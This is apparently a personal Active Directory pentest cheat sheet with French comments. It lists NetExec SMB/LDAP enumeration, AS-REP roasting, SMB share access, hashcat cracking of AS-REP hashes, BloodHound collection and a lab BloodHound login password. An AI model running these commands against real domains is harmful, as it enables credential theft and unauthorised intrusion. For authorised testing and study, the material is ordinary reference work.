## NXC

```bash
nxc smb <IP> ## Check domain info

nxc smb <IP> -u "<USER>" -p "<PASSWORD>" ## Auth SMB 

nxc smb <IP> -u "<USER>" -p "<PASSWORD>" --shares ## Liste share smb

nxc ldap <IP> -u "<USER>" -p "" -d <DOMAIN> --asreproast <file> ## AS-REP roasting 

nxc ldap <IP> -u "<USER>" -p "<PASSWORD>" -d <DOMAIN> --users ## enum user LDAP

nxc ldap <IP> -u "<USER>" -p "<PASSWORD>" -d <DOMAIN> --groups ## enum groupe LDAP

nxc ldap <IP> -u "<USER>" -p "<PASSWORD>" -d <DOMAIN> --user <USER> ## Info user LDAP

nxc winrm <IP> -u "<USER>" -p "<PASSWORD>" ## Connexion WinRM
```

## SMB

```bash
smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP" ## Connexion au serveur SMB

shares ## List des shares

use <share> ## Se connecter à un share 
```

## Hashcat

```bash
hashcat -m 18200 asrep.txt /opt/lists/rockyou.txt ## Crack le hash AS-REP
```

## Bloodhound

```bash
bloodhound-python -u $USER -p $PASSWORD -d $DOMAIN -ns $IP -c All ## Récupération des éléments de l'AD

bloodhound-ce &>/dev/null & ## Interface Web
user: admin
mdp: @PentestAD1234!!

```

